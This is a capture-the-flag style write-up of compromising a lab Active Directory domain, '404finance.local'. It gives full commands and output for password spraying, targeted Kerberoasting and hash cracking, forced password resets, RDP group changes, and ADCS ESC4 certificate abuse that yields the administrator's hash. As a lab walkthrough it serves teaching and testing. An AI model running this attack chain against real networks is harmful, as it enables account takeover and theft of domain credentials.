---
cover: ../.gitbook/assets/5e39f60d-8680-4b5b-978d-866abaae14fa.png
coverY: 0
coverHeight: 255
---

# 404 Bank(AD)

## Initial Enumeration:

### NMAP:

```python
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 404 Finance Group
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-03-06 17:36:30Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-03T13:35:22
| Not valid after:  2026-07-03T13:35:22
| MD5:     973b 12f1 4d87 bf34 45ae b38e 798f 0ef5
| SHA-1:   5750 d3f9 153e 80af 4ae5 0939 b772 c2f2 cc8b 9e59
| SHA-256: 1cea 087d 276c c7cd ec01 f54c 365c 04ef 4047 f75c 0e59 422f 55d8 cdfb 1c5e 3df7
|_ssl-date: 2026-03-06T17:38:10+00:00; -3s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-06T17:38:10+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-03T13:35:22
| Not valid after:  2026-07-03T13:35:22
| MD5:     973b 12f1 4d87 bf34 45ae b38e 798f 0ef5
| SHA-1:   5750 d3f9 153e 80af 4ae5 0939 b772 c2f2 cc8b 9e59
| SHA-256: 1cea 087d 276c c7cd ec01 f54c 365c 04ef 4047 f75c 0e59 422f 55d8 cdfb 1c5e 3df7
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-06T17:38:10+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-03T13:35:22
| Not valid after:  2026-07-03T13:35:22
| MD5:     973b 12f1 4d87 bf34 45ae b38e 798f 0ef5
| SHA-1:   5750 d3f9 153e 80af 4ae5 0939 b772 c2f2 cc8b 9e59
| SHA-256: 1cea 087d 276c c7cd ec01 f54c 365c 04ef 4047 f75c 0e59 422f 55d8 cdfb 1c5e 3df7
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-07-03T13:35:22
| Not valid after:  2026-07-03T13:35:22
| MD5:     973b 12f1 4d87 bf34 45ae b38e 798f 0ef5
| SHA-1:   5750 d3f9 153e 80af 4ae5 0939 b772 c2f2 cc8b 9e59
| SHA-256: 1cea 087d 276c c7cd ec01 f54c 365c 04ef 4047 f75c 0e59 422f 55d8 cdfb 1c5e 3df7
|_ssl-date: 2026-03-06T17:38:10+00:00; -3s from scanner time.
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-03-06T17:38:10+00:00; -3s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Issuer: commonName=DC-404.404finance.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-27T22:25:59
| Not valid after:  2026-07-29T22:25:59
| MD5:     e67c b022 d721 1bdd cfeb 0a70 a770 517b
| SHA-1:   22e6 e996 1668 68d3 7e35 fa1d 91b0 1a17 0a53 9471
| SHA-256: 58d9 47f5 361d 65a8 b522 7b1a ddfd 0503 33af 665d 68f7 8b85 c260 2986 7db3 5b53
| rdp-ntlm-info: 
|   Target_Name: FINANCE404
|   NetBIOS_Domain_Name: FINANCE404
|   NetBIOS_Computer_Name: DC-404
|   DNS_Domain_Name: 404finance.local
|   DNS_Computer_Name: DC-404.404finance.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-06T17:37:31+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49705/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49715/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```

### Port 80 (HTTP):

```python
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 404 Finance Group
```

* Here we see that there is a web interface running on the machine so we go ahead and check it.

<figure><img src="../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

* Here we see a bunch of names given, so as we haven’t been provided with the credentials we can use these names and generate a bunch of usernames using the username generator.

{% embed url="https://github.com/florianges/UsernameGenerator" %}

<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

* heading over to the services tab we see a download link to an `exe` file.
* We go ahead and Download it.
* After downloading we use the `strings` command on the exe file.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ strings CorpBankDialer.exe 
/lib64/ld-linux-x86-64.so.2
__libc_start_main
__cxa_finalize
printf
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Welcome to CorpBank SecureAccess v3.7.2\n
DEBUG: ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=\n
;*3$"
GCC: (Debian 14.2.0-19) 14.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
CorpBankDialer.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
_edata
_fini
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.note.gnu.property
.note.gnu.build-id
.interp
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.note.ABI-tag
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
 
```

* We find that there is a base64 encoded value in the Debug parameter so we decode it.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ echo "ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=" > basehash.txt
```

```python
──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ base64 -d basehash.txt 
dd2ef34530de7e5bef22a05e7e5dd178
```

* This is a hash and when cracking the hash, it gives the result as:

```python
Password123!!
```

### Compromising `karl.hackermann` :

```python
┌──(kali㉿kali)-[~/Downloads/UsernameGenerator]
└─$ nxc smb 404finance.local -u actualusers.txt -p 'Password123!!'
SMB         10.1.33.35      445    DC-404           [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-404) (domain:404finance.local) (signing:True) (SMBv1:False) 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\meier:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\alex:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\alex.meier:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\meier.alex:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\alex-meier:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\meier-alex:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\alexmeier:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\meieralex:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\alex_meier:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\meier_alex:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\Robert_G:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\hackermann:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [-] 404finance.local\karl:Password123!! STATUS_LOGON_FAILURE 
SMB         10.1.33.35      445    DC-404           [+] 404finance.local\karl.hackermann:Password123!! 
```

* As we can see after password spraying we have successfully compromised our first user `karl.hackermann` .
* Now let’s see what shares he is able to access.

```python
┌──(kali㉿kali)-[~/Downloads/UsernameGenerator]
└─$ nxc smb 404finance.local -u karl.hackermann -p 'Password123!!' --shares
SMB         10.1.33.35      445    DC-404           [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-404) (domain:404finance.local) (signing:True) (SMBv1:False) 
SMB         10.1.33.35      445    DC-404           [+] 404finance.local\karl.hackermann:Password123!! 
SMB         10.1.33.35      445    DC-404           [*] Enumerated shares
SMB         10.1.33.35      445    DC-404           Share           Permissions     Remark
SMB         10.1.33.35      445    DC-404           -----           -----------     ------
SMB         10.1.33.35      445    DC-404           ADMIN$                          Remote Admin
SMB         10.1.33.35      445    DC-404           C$                              Default share
SMB         10.1.33.35      445    DC-404           IPC$            READ            Remote IPC
SMB         10.1.33.35      445    DC-404           NETLOGON        READ            Logon server share 
SMB         10.1.33.35      445    DC-404           SYSVOL          READ            Logon server share 
```

* As we can see there are no interesting shares that are present

## Bloodhound:

### Collecting `BloodHound` loot:

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ nxc ldap 10.1.33.35 -u karl.hackermann -p 'Password123!!' --bloodhound --collection all --dns-server 10.1.33.35

```

### BloodHound Analysis:

<figure><img src="../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

* We see that our compromised user has `GenericWrite` over the user `tom reboot` so we can exploit it and compromise this user.

## Compromising `Tom Reboot` :

```python
┌──(.venv)─(kali㉿kali)-[~/Downloads/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (tom.reboot)
[+] Printing hash for (tom.reboot)
$krb5tgs$23$*tom.reboot$404FINANCE.LOCAL$404finance.local/tom.reboot*$cee6fcbdf9b5909644f17a170f5cc8de$7ba44c0cdcb5d963a7e38cd891fd94930dc7d4c89bbd322b8e5d50352315a085bea648288165be6b8ef8935e14cfc26eed1957f60fb865ca219432cd7c1920caabd39770ff389c4a20fa247ed24cc7a8092003135fce9cf140d4d08e789c623c4a8d3dbc29c42cf2ac414e26470c86b4ff4f468a5d039b15cfd7550bfc8a30429cfeba665a3eb8a8e55e174d9a8b3db61ffad6cc6ba81ce04fcf83421f50607fb3ce1b4d1e64f2a6b9aa9fff062f77a97fad51e4b60748d5b4bb09f25968defb5575bb7c752c92e1b9f2a600db9b87f980e97e3086ec1ed512b252a13725c96b33ceb4c80717c24292ed9423bcdf6676c7a223d1c9c26f713917782de3541f7f7f908d04e791905864288e854fae1001b0f6c5e87cbcb25b1472819a24dd141f2a7d3144697dc1620f536fa062795f85d6d0d7a723fa18d7e015326a12185234c1a090f0d79373e5a331af71776d6031755837517f2c2a1e4bbf852d08a7a290bc552597a218ab87c39d98369bb4790f8f717939aa59e9f01ca6436c8eaec497a4ded072a0fe79e8d6da270ae513955d18adba7d30ff72161cc4526702bdca25f8233ca614003a7298f83493b3fa827e8e68c15cf1726e9f44d3dcad2b708f11bba2be6569806b76b969f72ac6a47cac2fe29ca613586e04cc44b6fbc8c7e67327246bb9bd24477689d6ceab48fecfee725f93de3698995d5597c41b00f6ecfd81ad30c148ca0de65c663e3c6b3386fca3c2858068e4bbc5bbde359e363f283259e82b4027e4083c5972f58da8ca44a328732c679532031740e34e7d128b4584c0229069e485ac564955d6b238cbdeeb94c206dc4481ca746d8f00bf87c96f3f00a4480bdbb432f05cd8a8a5f7e833cb2c56a37ee7614b3dc038c9d1e845acc7b7693bb7214913885828904553f50d229ddd4009c548841102a5e1528801d92067fc57f2a3a2bc3dd262566af224cf2c9111c4b74da1691050ebf9208c1784465ca8c3a3aeee321f521c1fe79bf14d06be98644b6041c770d78742c8aafbb2359a68152a24e0f37ef781ae20a9d1dfbcad2d58e7d6faf57012c1c78503d95ef05624d97b1ea8d5e64461273d3cdc550f501135939149fcffe4aad46ef2cadd0f40ef1e167d218c2cf9982f7fb731981b85088f66f3c54ec624bbcfd5cb6d28474562822c2acfac7e5391c27d1d0f7511c84b562280405e1c108ec587346f888d4bff406fa9246aba5d18948552824bc3c7129d7eef1eb51149e548a80f99310ebd8ae0e621b9d106b21fe22335f8b4819d715a39ce48dc889e6a56816f5e303cb490770f8926c48d9e5f5dc482b5c7a96ae7eda7b367a1647c94c66bcab33131210c90662af14a506a59ab15ff551a0addf63b2dfec9d33c288ffaab14446dfca854c1e2c1847d685b653fb9861107510c856c7f007d907a93df0af4409cf2204654d68aea96d70e7b6882451e45312e232917f897e8c9a3986f31e7ba52c58c67e324ab2397326832a90143a7f4799cf94e4ea551844d832f918cb7f8fd9ef3c5da2fcde2c2945e33fddcafd3317569b85b209217a4fcc575ac116a5abf35a5
[VERBOSE] SPN removed successfully for (tom.reboot)

```

* We performed a targeted Kerberoast attack and got the hash for this user and now we crack it.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tomhash.txt --rules
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd123      (?)     
1g 0:00:00:07 DONE (2026-03-12 13:57) 0.1319g/s 1419Kp/s 1419Kc/s 1419KC/s PA"TI%TO..P1nkr1ng
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

```python
tom.reboot:P@ssw0rd123
```

## Compromising `Robert Graef` :

<figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

* By analysing bloodhound we see that our user has `ForceChangePassword` over this user and now we exploit it.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ net rpc password "robert.graef" "newP@ssword2022" -U "404finance.local"/"tom.reboot"%"P@ssw0rd123" -S "dc-404.404finance.local" 
```

* Now we analyse bloodhound for further movement.

## Privilege Escalation:

<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

* We see that our user has force change password over 3 users and and we are also able to `add member` in the RDP group.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ net rpc password "nina.inkasso" "newP@ssword2022" -U "404finance.local"/"robert.graef"%"newP@ssword2022" -S "DC-404.404finance.local" 

```

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ net rpc password "jan.tresor" "newP@ssword2022" -U "404finance.local"/"robert.graef"%"newP@ssword2022" -S "dc-404.404finance.local" 
```

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ net rpc password "melanie.kunz" "newP@ssword2022" -U "404finance.local"/"robert.graef"%"newP@ssword2022" -S "DC-404.404finance.local" 
```

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ net rpc group addmem "REMOTE DESKTOP USERS" "jan.tresor" -U "404finance.local"/"robert.graef"%"newP@ssword2022" -S "dc-404.404finance.local"
```

* Now we have added the user `Jan.tresor` to the RDP group

<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

* When we RDP as this user, we can see some files in the recycle bin so first we restore them and open them.

<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

* Upon opening one of the file we see that there is a password present for user `daniel.hoffmann` .

<figure><img src="../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

```python
daniel.hoffmann:RemoteAccess!2024
```

* This user has `ForceChangePassword` right over `Web admin`

<figure><img src="../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ net rpc password "webadmin" "newP@ssword2022" -U "404finance.local"/"daniel.hoffmann"%'RemoteAccess!2024' -S "dc-404.404finance.local"
```

* Upon viewing the listening ports we see that port `5000` is in listening state so we go ahead and see it on the browser.

<figure><img src="../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

* Here we see that there is a zip file present so we download it and move to our kali.
* Upon unzipping the file we see that there is a file named `config.dat` and this contains the credentials for `svc.services` user.

<figure><img src="../.gitbook/assets/image (94).png" alt=""><figcaption></figcaption></figure>

```python
svc.services:S3rv1cePower2024!
```

* We had to change password for `svc.services` user as it was disabled.

## Compromising `Administrator` :

* We already saw while enumerating in the beginning and during enumeration that there is ADCS present in the domain so we check for any vulnerable template.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ certipy-ad find -u 'svc.services' -p 'newP@ssword2022' -dc-ip 10.1.33.35 -enabled -vuln -ldap-scheme ldap -stdout
```

```python
ESC4                              : User has dangerous permissions.
```

* We see that there is `ESC-4` Vulnerable template present so we exploit it.

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ certipy-ad template \                                                                                             
    -u 'svc.services@404finance.local' -p 'newP@ssword2022' \
    -dc-ip '10.1.33.35' -template 'Vuln-ESC4' \
    -write-default-configuration
```

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ certipy-ad req \                                                                                                  
    -u 'svc.services@404finance.local' -p 'newP@ssword2022' \
    -dc-ip '10.1.33.35' -target 'dc-404.404finance.local' \
    -ca '404finance-DC-404-CA' -template 'Vuln-ESC4' \
    -upn 'administrator@404finance.local' -sid 'S-1-5-21-2956725473-317782918-2795636496-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@404finance.local'
[*] Certificate object SID is 'S-1-5-21-2956725473-317782918-2795636496-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```python
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/404bank]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.1.33.35'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@404finance.local'
[*]     SAN URL SID: 'S-1-5-21-2956725473-317782918-2795636496-500'
[*]     Security Extension SID: 'S-1-5-21-2956725473-317782918-2795636496-500'
[*] Using principal: 'administrator@404finance.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@404finance.local': aad3b435b51404eeaad3b435b51404ee:a6019e48da8f602a60c30a6f0136d792

```

* Now we can see that the administrator hash is dumped so we go ahead and use `evil-winrm` tool.

<figure><img src="../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>
